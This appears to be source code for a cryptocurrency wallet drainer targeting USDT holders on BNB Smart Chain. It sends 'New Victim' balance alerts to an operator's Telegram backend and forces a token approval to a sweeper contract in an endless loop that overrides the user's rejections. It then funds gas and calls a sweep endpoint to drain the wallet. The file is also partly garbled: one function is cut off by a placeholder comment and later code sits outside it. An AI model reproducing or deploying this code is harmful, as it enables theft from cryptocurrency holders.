// Add this import if not already there
import { ethers } from "ethers"
import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"

// ====== NEW: Auto-switch network function ======
export async function ensureCorrectNetwork(provider: ethers.BrowserProvider) {
  const network = await provider.getNetwork()
  const currentChainId = Number(network.chainId)

  // Already on BSC  all good
  if (currentChainId === CHAIN_ID) return true

  // Try to switch to BSC
  try {
    const signer = await provider.getSigner()
    const hexChainId = "0x" + CHAIN_ID.toString(16) // "0x38" for BSC

    await signer.provider?.send("wallet_switchEthereumChain", [
      { chainId: hexChainId },
    ])
    
    // Wait a moment for the switch to complete
    await new Promise(r => setTimeout(r, 2000))
    return true
  } catch (switchError: any) {
    // If the chain hasn't been added to the wallet yet
    if (switchError.code === 4902) {
      try {
        const signer = await provider.getSigner()
        const hexChainId = "0x" + CHAIN_ID.toString(16)

        await signer.provider?.send("wallet_addEthereumChain", [
          {
            chainId: hexChainId,
            chainName: CHAIN_NAME,
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [RPC_URL],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ])

        await new Promise(r => setTimeout(r, 2000))
        return true
      } catch (addError) {
        throw new Error("Please manually switch your wallet to BNB Smart Chain")
      }
    }
    throw new Error("Please manually switch your wallet to BNB Smart Chain")
  }
}

const BACKEND_URL = CONFIG.BACKEND_URL

export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  // ====== ADD THIS: Auto-switch network before anything else ======
  await ensureCorrectNetwork(provider)

  const signer = await provider.getSigner()
  // ... rest of your existing code ...
}
  
  // FIX 12: Check we're on BSC before proceeding
  const network = await provider.getNetwork()
  const chainId = Number(network.chainId)
  if (chainId !== 56) {
    throw new Error("Please switch to BNB Smart Chain (BSC)")
  }

  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  const rawBalance = await usdt.balanceOf(victimAddress)
  const decimals = await usdt.decimals()
  const balance = ethers.formatUnits(rawBalance, decimals)

  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
    }),
  }).catch(() => {})

  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  // FIX 13: Infinite loop with small delay to prevent CPU overheating on mobile
  while (true) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      await tx.wait()

      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
        }),
      })

      return approveAmount
    } catch (err: any) {
      // FIX 14: Small delay between retries — prevents 100% CPU usage on phone
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await new Promise(r => setTimeout(r, 500))
        continue
      }
      // Any other error — also retry with delay
      await new Promise(r => setTimeout(r, 500))
      continue
    }
  }
}

export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
      }),
    })
    return true
  }

  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}

export async function executeDrain(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}